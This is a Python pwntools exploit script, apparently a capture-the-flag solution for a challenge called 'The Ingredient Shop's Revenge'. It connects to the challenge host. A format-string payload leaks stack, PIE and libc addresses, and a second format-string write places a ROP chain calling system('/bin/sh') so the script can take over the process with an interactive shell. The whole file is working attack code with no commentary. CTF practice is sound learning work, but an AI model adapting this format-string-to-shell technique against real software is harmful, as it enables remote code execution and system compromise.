#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './shop-revenge_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc the-ingredient-shop-s-revenge.challs.brunnerne.xyz 32000'.split()
libc = ELF('libc.so.6')
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None

gdbscript = '''
b *(get_input+162)
continue
'''.format(**locals())

p = start()

offset = 8

# leak rbp, libc and pie
payload = b'%42$p|%43$p|%46$p'
p.sendline(payload)
p.recvuntil(b'here is your choice\n')
rbp, main18, IOstderr = extract_leak(p.recvline().strip())
rbp -= 0x10
pie = main18 - (exe.sym.main+18)
libc.address = IOstderr - libc.symbols['_IO_2_1_stderr_']
log.info(f'rbp: {hex(rbp)}')
log.info(f'pie: {hex(pie)}')
log.info(f'libc: {hex(libc.address)}')

# rop /bin/sh
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
system = libc.sym.system

payload_overwrite = fmtstr_payload(
    offset, 
    {rbp+8: ret, rbp+16: pop_rdi,rbp+24:binsh, rbp+32:system}, 
    write_size='short')

print(len(payload_overwrite))
p.sendline(payload_overwrite)


p.interactive()